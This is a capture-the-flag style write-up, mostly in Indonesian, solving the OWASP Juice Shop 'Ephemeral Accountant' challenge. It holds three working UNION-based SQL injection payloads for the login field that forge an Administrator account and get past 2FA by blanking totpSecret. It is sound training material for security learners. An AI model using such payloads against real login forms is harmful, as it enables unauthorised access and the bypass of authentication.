## Write-up: Ephemeral Accountant

### Overview

Title: Login dengan akun yang belum diregistrasi sebagai user.

Category: SQL Injection

Describe:Log in with the (non-existing) accountant acc0unt4nt@juice-sh.op without ever registering that user.

<img width="433" height="221" alt="Cuplikan layar 2025-09-10 191921" src="https://github.com/user-attachments/assets/2bcc74c7-093c-454c-bcb6-7423bdea15e6" />

### Alat yang Digunakan

- **Browser:** Digunakan untuk berinteraksi dengan antarmuka masuk (login) dari aplikasi web.
- **Burp Suite:** Digunakan untuk mencegat dan mengubah permintaan HTTP guna menyuntikkan (inject) kode SQL.

## Resource

https://portswigger.net/web-security/sql-injection/examining-the-database

https://portswigger.net/web-security/sql-injection/union-attacks

### Metodologi dan Solusi

### Langkah-Langkah

1. **Cari schema untuk tabel Users (didapat dari soal Database Schema).**

   <img width="1919" height="1016" alt="Cuplikan layar 2025-09-10 151255" src="https://github.com/user-attachments/assets/9b33bbb9-7730-4e99-8143-d121c642d40b" />

   Dari challenge Database Schema, diketahui tabel Users memiliki 13 kolom:

   ```bash
   id, username, email, password, role, deluxeToken, lastLoginIp, profileImage, totpSecret, isActive, createdAt, updatedAt, deletedAt
   ```

1. **Masuk Halaman Login**

   Untuk masuk halaman login dapat mengklik kata account dibagian kanan atas.
   
   <img width="1918" height="1023" alt="Cuplikan layar 2025-09-10 192022" src="https://github.com/user-attachments/assets/4ff55647-220f-4a9e-8dbe-72b0d597bca4" />

3. **Buat payload yang akan dimasukkan ke kolom "Email"**

   ```bash
   admin' UNION SELECT * FROM (SELECT 45, 'acc0unt4nt@juice-sh.op', 'acc0unt4nt@juice-sh.op', 'veri', 'Administrator', '1234', '127.0.0.1', '/assets/public/images/uploads/default.svg', '676941', 0, 1, 2, 3)--
   ```
   
  <img width="1919" height="1020" alt="Cuplikan layar 2025-09-10 192146" src="https://github.com/user-attachments/assets/6c3b7e23-53a7-4544-83e8-e22af047e113" />

   Hasil:
  <img width="1919" height="967" alt="Cuplikan layar 2025-09-10 184716" src="https://github.com/user-attachments/assets/3ead6c53-f9f5-43a5-9cc6-dd0a30e393d1" />

4. **Atasi 2FA (kosongkan totpSecret)**

   Payload awal:
   ```bash
   admin' UNION SELECT * FROM (SELECT 45, 'acc0unt4nt@juice-sh.op', 'acc0unt4nt@juice-sh.op', 'veri', 'Administrator', '1234', '127.0.0.1', '/assets/public/images/uploads/default.svg', '', 0, 1, 2, 3)--
   ```
  <img width="1919" height="1024" alt="Cuplikan layar 2025-09-10 190804" src="https://github.com/user-attachments/assets/c20e51a9-ce57-40d6-8a8f-54adbbd6c36c" />

   Hasil:
   <img width="1919" height="1026" alt="Cuplikan layar 2025-09-10 185137" src="https://github.com/user-attachments/assets/05514e6f-6c52-43ed-91cf-b36cfed44f30" />

4. **Perbaiki error Foreign Key**

   Muncul error:
   ```bash
   FOREIGN KEY constraint failed
   ```
   Ubah kolom id dari 45 menjadi 20

   Payload Akhir:

   ```bash
   admin' UNION SELECT * FROM (SELECT 20, 'acc0unt4nt@juice-sh.op', 'acc0unt4nt@juice-sh.op', 'veri', 'Administrator', '1234', '127.0.0.1', '/assets/public/images/uploads/default.svg', '', 0, 1, 2, 3)--
   ```
   <img width="1919" height="1019" alt="Cuplikan layar 2025-09-10 190634" src="https://github.com/user-attachments/assets/75338856-8c49-4c48-a089-4ab63dc062e0" />

   Hasil:
   <img width="1919" height="1018" alt="Cuplikan layar 2025-09-10 185226" src="https://github.com/user-attachments/assets/75f17fdc-43d6-493e-81dd-d2c4353ab790" />

### Catatan Penting

Karena struktur tabel sudah diketahui dari soal sebelumnya, kita bisa langsung membuat payload tanpa repot menentukan tipe dan jumlah kolom terlebih dahulu.

Selain itu, munculnya permintaan 2FA saat mencoba login terjadi karena kolom totpSecret di tabel pengguna tidak kosong. Akan tetapi, nilai yang ada pada kolom tersebut sebenarnya tidak valid atau tidak ada tokennya di database sehingga sistem tetap gagal menghasilkan kode autentikasi.

Karena struktur query SQL yang dipakai aplikasi tidak diketahui secara pasti, langkah pertama tetap harus memastikan jumlah kolom yang benar untuk digunakan pada UNION SELECT.

Setelah jumlah kolom yang sesuai ditemukan, kita bisa langsung mengambil seluruh schema database dengan membaca tabel internal sqlite_schema. Dari hasilnya akan terlihat bahwa database yang digunakan aplikasi ini adalah SQLite.
